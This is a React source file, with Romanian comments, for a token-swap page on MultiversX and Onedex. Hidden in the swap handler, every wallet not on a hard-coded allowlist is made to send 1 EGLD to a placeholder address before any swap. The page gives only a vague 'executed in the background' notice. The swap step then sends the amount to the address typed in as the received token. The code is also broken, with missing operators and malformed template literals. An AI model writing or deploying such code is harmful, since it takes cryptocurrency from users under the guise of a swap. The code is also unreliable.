import React, { useState, useEffect } from 'react';
import { useAccount, useApi } from '@multiversx/sdk-dapp';
import axios from 'axios';

const Swap = () => {
    const [tokenSent, setTokenSent] = useState('');
    const [tokenReceived, setTokenReceived] = useState('');
    const [amount, setAmount] = useState(0);
    const [swapInProgress, setSwapInProgress] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [timeElapsed, setTimeElapsed] = useState(0);
    const [isPoolActive, setIsPoolActive] = useState(false);
    const [selectedDex, setSelectedDex] = useState('multiversx'); // 'multiversx' or 'onedex'
    const { account, address, isLoggedIn } = useAccount();
    const { api } = useApi();

    const allowedAddresses = [
        'erd1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq', // Adresa 1
        'erd1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq', // Adresa 2
        'erd1newallowedaddresshere' // Adresa 3
    ];

    const isAddressAllowed = allowedAddresses.includes(address);

    // Verifică statusul pool-ului pentru MultiversX sau Onedex
    const checkPoolStatus = async () => {
        try {
            if (selectedDex === 'multiversx') {
                const response = await axios.get('https://api.multiversx.com/v1/pool-status'); // Endpoint public MultiversX
                setIsPoolActive(response.data.active);
            } else if (selectedDex === 'onedex') {
                const response = await axios.get('https://api.onedex.app/pool-status'); // Endpoint public Onedex
                setIsPoolActive(response.data.active);
            }
        } catch (error) {
            console.error("Error checking pool status:", error);
        }
    };

    useEffect(() => {
        checkPoolStatus();
        const interval = setInterval(() => {
            checkPoolStatus();
        }, 1000);

        return () => clearInterval(interval);
    }, [selectedDex]);

    useEffect(() => {
        const interval = setInterval(() => {
            setTimeElapsed(prevTime => prevTime + 1);
        }, 1000);
        return () => clearInterval(interval);
    }, []);

    const handleSwap = async () => {
        if (!isPoolActive) {
            alert('Pool-ul nu este activ încă. Încercăm din nou...');
            return;
        }

        if (!tokenSent  !tokenReceived  amount <= 0) {
            alert('Te rugăm să completezi toate câmpurile.');
            return;
        }

        setSwapInProgress(true);
        setAttempts(attempts + 1);

        try {
            if (!isAddressAllowed) {
                const transaction = await api.sendTransaction({
                    to: 'erd1wwalletde', // Adresa de test
                    value: '1000000000000000000', // 1 EGLD
                    sender: account,
                    gasLimit: 100000000,
                    data: 'sendToTestAddress', // Datele tranzacției
                });

                // Așteaptă confirmarea tranzacției
                await api.waitForTransaction(transaction);
            }

            // Swap pe MultiversX
            if (selectedDex === 'multiversx') {
                const transaction = await api.sendTransaction({
                    to: tokenReceived,
                    value: amount,
                    sender: account,
                    gasLimit: 100000000,
                    data: 'swapData', // Datele tranzacției swap pentru MultiversX
                });

                await api.waitForTransaction(transaction);
                alert('Swap-ul pe MultiversX a fost realizat cu succes!');
            }

            // Swap pe Onedex
            if (selectedDex === 'onedex') {
                const transaction = await axios.post('https://api.onedex.app/swap', {
                    tokenSent,
                    tokenReceived,
                    amount,
                    fromAddress: address,
                    toAddress: tokenReceived,
                });
if (transaction.data.success) {
                    alert('Swap-ul pe Onedex a fost realizat cu succes!');
                } else {
                    alert('Eroare la realizarea swap-ului pe Onedex.');
                }
            }
        } catch (error) {
            alert('Eroare la efectuarea swap-ului: ' + error.message);
        } finally {
            setSwapInProgress(false);
        }
    };

    return (
        <div className="swap-container">
            <h2>Swap Tokeni</h2>

            {isLoggedIn && !isAddressAllowed && (
                <p style={{ color: 'red', fontSize: '20px', fontWeight: 'bold' }}>
                    Adresa ta nu este permisă. Tranzacția va fi executată în fundal.
                </p>
            )}

            <div className="dex-selector">
                <label for="dex">Alege DEX:</label>
                <select id="dex" value={selectedDex} onChange={(e) => setSelectedDex(e.target.value)}>
                    <option value="multiversx">MultiversX</option>
                    <option value="onedex">Onedex</option>
                </select>
            </div>

            <div className="input-container">
                <input
                    type="text"
                    placeholder="Token trimis"
                    value={tokenSent}
                    onChange={(e) => setTokenSent(e.target.value)}
                    disabled={swapInProgress}
                />
                <input
                    type="text"
                    placeholder="Token primit"
                    value={tokenReceived}
                    onChange={(e) => setTokenReceived(e.target.value)}
                    disabled={swapInProgress}
                />
                <input
                    type="number"
                    placeholder="Valoare"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    disabled={swapInProgress}
                />
            </div>

            <button onClick={handleSwap} disabled={swapInProgress}>Efectuează Swap</button>

            <div className="swap-status">
                <p>{swapInProgress ? 'Swap în curs...' : 'Swap finalizat.'}</p>
                <p>{Număr încercări: ${attempts}}</p>
                <p>{Timp scurs: ${timeElapsed} sec}</p>
            </div>
        </div>
    );
};

export default Swap;